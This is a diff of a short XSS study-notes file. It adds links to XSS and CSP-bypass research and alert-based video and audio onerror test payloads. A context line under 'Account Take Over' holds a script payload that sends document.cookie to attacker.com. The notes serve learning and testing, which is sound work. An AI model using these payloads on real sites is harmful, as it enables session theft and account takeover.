@@ -1,6 +1,15 @@
 # Further Learning
 > https://aszx87410.github.io/beyond-xss/en/
+> https://thespanner.co.uk/2009/03/20/html5-xss
+> https://thespanner.co.uk/2008/12/01/location-based-xss-attacks
+> https://thespanner.co.uk/2009/11/23/bypassing-csp-for-fun-no-profit
+> https://thespanner.co.uk/
 
+> https://sirdarckcat.blogspot.com/2008/10/about-css-attacks.html
+> https://blog.jeremiahgrossman.com/2009/06/results-unicode-leftright-pointing.html
+
+<pre lang="javascript"> &lt;video src=1 onerror=alert(1)&gt; &lt;audio src=1 onerror=alert(1)&gt; </pre>
+ 
 
 ## Account Take Over
 > https://xss.example.com/?input=<script>document.location="http://attacker.com/index.php?cookie=" + document.cookie;</script>
